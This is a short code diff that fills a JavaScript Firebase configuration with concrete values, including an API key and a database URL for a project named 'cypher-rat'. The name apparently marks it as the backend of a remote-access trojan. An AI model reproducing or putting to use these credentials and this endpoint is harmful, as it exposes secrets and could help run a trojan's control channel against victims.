@@ -2,13 +2,13 @@
 
 
     var firebaseConfig = {
-    apiKey: "API KEY",
+    apiKey: "AIzaSyAS_BwAmyPacOj2wI16gOZQXar2IgP0DeU",
     authDomain: "AUTH DOMAIN",
-    databaseURL: "DATABSE URL",
-    projectId: "PROJECT ID",
-    storageBucket: "BUCKET URL",
-    messagingSenderId: "SENDER ID",
-    appId: "APP ID"
+    databaseURL: "https://cypher-rat-default-rtdb.firebaseio.com",
+    projectId: "cypher-rat",
+    storageBucket: "cypher",
+    messagingSenderId: "1:875807971760:android:ba2dd12d7dd843e2aade75",
+    appId: "1:875807971760:android:ba2dd12d7dd843e2aade75"
   }; 
  
 ////Do Not Edit Below This
